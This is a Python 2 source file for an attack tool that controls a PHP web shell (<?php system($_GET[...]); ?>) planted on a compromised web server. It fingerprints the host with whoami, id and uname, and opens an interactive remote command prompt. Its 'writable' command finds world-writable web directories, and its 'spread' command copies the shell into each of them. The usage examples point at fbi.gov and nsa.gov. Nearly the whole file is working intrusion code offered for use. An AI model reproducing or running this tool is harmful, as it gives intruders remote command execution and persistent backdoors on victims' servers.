#!/usr/bin/env python

'''
-*- coding: utf-8 -*-
Copyright 2012 Ahmed Shawky @lnxg33k <ahmed@isecur1ty.org>

Command controller for <?php system($_GET[parameter]); ?>

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
See the GNU General Public License for more details.
'''

#importing modules
from sys import argv
import argparse
from urllib2 import urlopen, Request, quote, unquote, URLError, HTTPError
from urllib import urlencode
from subprocess import Popen
try:
    import readline
except ImportError:
    print '\n[!] readline module is required to provide elaborate line editing and history features.'
else:
    pass


class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    YELLOW = '\033[93m'
    HOT = '\033[97m'
    END = '\033[0m'


class RequestType():
    def __init__(self, url=None, method='get', parameters=None):
        self.url = url
        self.cmd = None
        self.cmd = 'whoami;id;uname -a;pwd;/sbin/ifconfig |grep -B1 "inet addr" |awk \'{ if ( $1 == "inet" ) { print $2 } else if ( $2 == "Link" ) { printf "%s:" ,$1 } }\' |awk -F: \'{ print $3 }\''

    def get_page_source(self):
        if method == 'post' or shell_parameter:
            request = Request(url)
            parameters = urlencode({shell_parameter: self.cmd})
            return urlopen(request, parameters)
        else:
            return urlopen('{}{}'.format(url, quote(self.cmd)))


class ServerInfo(RequestType):
    # defining static methods
    @staticmethod
    def banner():
        return """{0}
\t\t __         ______   ______   .___  ___. .___  ___.      ___      .__   __.  _______
\t\t|  |       /      | /  __  \  |   \/   | |   \/   |     /   \     |  \ |  | |       \\
\t\t|  |      |  ,----'|  |  |  | |  \  /  | |  \  /  |    /  ^  \    |   \|  | |  .--.  |
\t\t|  |      |  |     |  |  |  | |  |\/|  | |  |\/|  |   /  /_\  \   |  . `  | |  |  |  |
\t\t|  |      |  `----.|  `--'  | |  |  |  | |  |  |  |  /  _____  \  |  |\   | |  '--'  |
\t\t|__|       \______| \______/  |__|  |__| |__|  |__| /__/     \__\ |__| \__| |_______/
\t\t--------------------------------------------------------------------------------------
        {1}""" .format(Colors.YELLOW, Colors.END)

    def get_information(self):
        try:
            self.source = source = map(str.strip, self.get_page_source().readlines())
            print ServerInfo.banner()
        except HTTPError:
            print '\n[!] Invalid URL.'
            exit(1)
        try:
            local_ip = (urlopen('http://ifconfig.me/ip').read()).strip()
        except URLError:
            local_ip = 'Unknown'
        available_commands = ['exit', 'clear', 'history', 'info', 'banner', 'writable', 'spread']
        self.info = \
        '''
        {dashed}
        {red}User{end}     :  {green}{current_user}{end}
        {red}ID{end}       :  {green}{current_id}{end}
        {red}Kernel{end}   :  {green}{kernel_info}{end}
        {red}CWD{end}      :  {green}{cwd}{end}
        {red}Host IPs{end} :  {green}{host_ip}{end}
        {red}Local IP{end} :  {green}{local_ip}{end}
        {dashed}

        {hot}[+] Available commands: {available_commands}.{end}
        {hot}[+] Inserting{end} {red}!{end} {hot}at the begining of the command will execute it on your box.{end}
        '''.format(dashed='-' * int(len(source[2]) + 12),
                red=Colors.RED, green=Colors.GREEN, end=Colors.END, hot=Colors.HOT,
                current_user=source[0],
                current_id=source[1],
                kernel_info=source[2],
                cwd=source[3],
                host_ip=', '.join(source[4:]),
                local_ip=local_ip,
                available_commands=available_commands,)
        print self.info


class Commander(ServerInfo):
    def BackConnect(self):
        i = 1
        history = []
        while True:
            try:
                try:
                    command = raw_input('{user}{red}@{end}{green}{host_ip}{end}:~{yellow}({cwd}){end}-$ '.format(user=serverinfo.source[0],
                        red=Colors.RED, green=Colors.GREEN, yellow=Colors.YELLOW, end=Colors.END,
                        host_ip=serverinfo.source[4],
                        cwd=serverinfo.source[3]))
                except IndexError:
                    command = raw_input('icommand@server:$ ')
                history.append(unquote(command))
                if command not in ['exit', 'quite', 'bye']:
                    if command == 'clear':
                        Popen('clear', shell=True).wait()
                    elif command == 'history':
                        x = 1
                        for command in history:
                            print '{0:2d} {1}'.format(x, command)
                            x += 1
                    elif command.startswith('!'):
                        Popen(command[1:], shell=True).wait()
                    elif command == 'info':
                        print serverinfo.info
                    elif command == 'banner':
                        print serverinfo.banner()
                    elif command == 'writable':
                        self.cmd = "find /var/www/ -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print"
                        self.writables = map(str.strip, self.get_page_source().readlines())
                        c = 1
                        for path in self.writables:
                            print '{0:2d}- {1}'.format(c, path)
                            c += 1
                    elif command == 'spread':
                        shell_name = url.split('/')[-1]
                        new_shell_name = raw_input('\n[!] Current shell name  {0}[default: {1}]{2}: '.format(Colors.RED, shell_name, Colors.END))
                        if shell_name == new_shell_name:
                            self.cmd = 'find /var/www -xdev -type d \( -perm -0002 -a ! -perm -1000 \) | xargs -n 1 cp {}'.format(shell_name)
                            print self.get_page_source().read()
                            print '[+] Successfully wrote {0} to some writable paths\n[+] Type writable to check dirs'.format(shell_name)
                        else:
                            self.cmd = 'find /var/www -xdev -type d \( -perm -0002 -a ! -perm -1000 \) | xargs -n 1 cp {}'.format(new_shell_name)
                            print self.get_page_source().read()
                            print '[+] Successfully wrote {0} to some writable paths\n[+] Type writable to check dirs'.format(new_shell_name)

                    else:
                        self.cmd = command
                        # to avoid issues realted to empty directories
                        if self.cmd == 'ls':
                            self.cmd = 'ls -lha'
                        source = self.get_page_source().read()
                        if source:
                            print source.rstrip()
                        else:
                            print '{}: command not found'.format(unquote(command))
                else:
                    print '\n\n[+] Preformed {} commands on the server.\n[!] Connection closed ..'.format(i)
                    exit(1)
            except KeyboardInterrupt:
                print '\n\n[+] Preformed {} commands on the server.\n[!] Connection closed ..'.format(i)
                exit(1)
            i += 1


def main():
    if len(argv) <= 1:
        print'''
{hot}-- Command controler for PHP system functions. --
--   Which works for POST and GET requests:    --{end}

{yellow}1-   <?php system($_GET['parameter']); ?>
2-   <?php system($_POST['parameter']); ?>{end}

run {red}{script} -h{end} for help'''.format(script=argv[0], hot=Colors.HOT, yellow=Colors.YELLOW, red=Colors.RED, end=Colors.END)

parser = argparse.ArgumentParser(
        add_help=False,
        usage='%(prog)s -h',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
    python %(prog)s --url http://www.fbi.gov/shell.php?cmd=
    python %(prog)s --url http://www.nsa.gov/shell.php --method POST --parameter cmd
    ''')
positional = parser.add_argument_group('Positional arguments')
positional.add_argument('-u', '--url', help='Full URL for the uploaded PHP code', metavar='')
optional = parser.add_argument_group('Optional arguments')
optional.add_argument('-h', '--help', action='help', help='Print this help message then exit.')
optional.add_argument('-m', '--method', dest='method', help='The method used in the uploaded PHP code (eg. post)', metavar='')
optional.add_argument('-p', '--parameter', dest='parameter', help='Parameter that used in the shell (eg. cmd)', metavar='')
options = parser.parse_args()
url = options.url
method = options.method.lower() if options.method else None
shell_parameter = options.parameter

if url:
    if method == 'post' and not shell_parameter:
        print '\n[!] Using post method requires --parameter flag, check examples'
        exit(1)
    if method == 'get' and shell_parameter:
        print '\n[!] Using get method doesn\'t require --parameter flag, check examples'
        exit(1)
    request_type = RequestType(url=url, method=method, parameters=shell_parameter)
    serverinfo = ServerInfo()
    serverinfo.get_information()
    commander = Commander()
    commander.BackConnect()
if __name__ == '__main__':
    main()
